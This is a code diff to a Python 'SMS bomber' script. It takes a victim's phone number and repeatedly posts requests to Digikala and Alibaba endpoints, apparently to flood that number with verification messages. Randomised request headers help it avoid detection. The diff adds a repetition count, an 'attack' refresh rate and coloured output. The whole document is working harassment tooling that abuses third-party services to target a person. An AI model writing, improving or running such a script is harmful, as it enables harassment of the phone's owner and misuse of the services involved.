@@ -3,7 +3,10 @@ import random
 import time
 
 #########################
-Blue="\033[1;34m"
+black = '\033[30m'
+white = '\033[37m'
+Blue ="\033[1;34m"
+yellow = '\033[33m'
 Red="\033[1;31m"
 Green="\033[1;33m"
 pink = "\033[95m"
@@ -14,8 +17,14 @@ purple = "\033[35m"
 #########################
 
 number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
-#attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
+
+attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
+
 sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))
+
+numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))
+
+i = 0
 
 heads = [
     {
@@ -72,25 +81,26 @@ url_digikala, json_digikala, url_alibaba, json_alibaba = data(number)
 
 
 
-while True:
+while i < numbert:
     random_head = random.choice(heads)
 
     req_Digikala = requests.post(url_digikala,json=json_digikala,headers=random_head)
-    print("Digakala",req_Digikala)
+    print(yellow + "1-Digikala : " + str(req_Digikala))
     time.sleep(sleep_time)
-    time.sleep(5)
+    time.sleep(15)
 
     req_Alibaba = requests.post(url=url_alibaba,json=json_alibaba)
-    print("Alibaba",req_Alibaba)
+    print(yellow + "2-Alibaba : " + str(req_Alibaba))
     time.sleep(sleep_time)
 
 
 
 
 
+ 
 
 
 
-
-    print(Blue + "Send all requests")
-#    time.sleep(attack_speed)
+    print([Blue + "Send all requests"])
+    time.sleep(attack_speed)
+    i += 1
